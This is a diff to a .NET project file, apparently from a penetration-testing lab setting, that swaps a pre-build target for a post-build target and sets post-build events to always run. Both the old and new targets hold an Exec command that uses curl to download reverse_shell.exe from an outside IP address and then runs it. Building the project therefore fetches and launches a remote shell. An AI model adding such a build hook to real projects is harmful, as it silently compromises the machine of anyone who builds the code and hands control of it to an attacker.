@@ -4,10 +4,11 @@
     <TargetFramework>net6.0</TargetFramework>
     <ImplicitUsings>enable</ImplicitUsings>
     <Nullable>enable</Nullable>
+    <RunPostBuildEvent>Always</RunPostBuildEvent>
   </PropertyGroup>
 
-  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
-    <Exec Command="curl &quot;http://10.10.16.14:9000/reverse_shell.exe&quot; -o &quot;C:/Users/Public/Documents/reverse_shell.exe&quot; &amp;&amp; start C:/Users/Public/Documents/reverse_shell.exe" />
+  <Target Name="PostBuild" AfterTargets="PostBuildEvent">
+    <Exec Command="curl &quot;http://10.10.16.14:9000/reverse_shell.exe&quot; -o &quot;C:/Users/Public/Documents/reverse_shell.exe&quot; &amp;&amp; &quot;C:/Users/Public/Documents/reverse_shell.exe&quot;" />
   </Target>
 
 </Project>
